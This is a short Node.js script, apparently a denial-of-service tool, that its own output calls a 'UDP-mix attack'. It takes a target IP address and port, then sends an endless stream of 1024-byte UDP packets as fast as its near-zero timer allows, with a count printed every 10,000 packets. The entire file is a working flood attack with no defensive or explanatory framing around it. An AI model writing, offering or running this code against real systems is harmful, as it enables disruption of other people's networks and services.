const dgram = require('dgram');
const process = require('process');

if (process.argv.length < 4) {
    console.log(`Usage: node ${process.argv[1]} <IP> <PORT>`);
    process.exit(1);
}

const targetIP = process.argv[2];
const targetPort = parseInt(process.argv[3]);
const packetSize = 1024;

const client = dgram.createSocket('udp4');
const message = Buffer.alloc(packetSize, 'X');

let sentPackets = 0;

function sendPacket() {
    client.send(message, targetPort, targetIP, (err) => {
        if (err) {
            console.error(`Error sending packet: ${err.message}`);
        }
    });

    sentPackets++;
    if (sentPackets % 10000 === 0) {
        console.log(`Sent ${sentPackets} packets...`);
    }

    setTimeout(sendPacket, 0.0001);
}

console.log(`Starting UDP-mix attack on ${targetIP}:${targetPort}...`);
sendPacket();
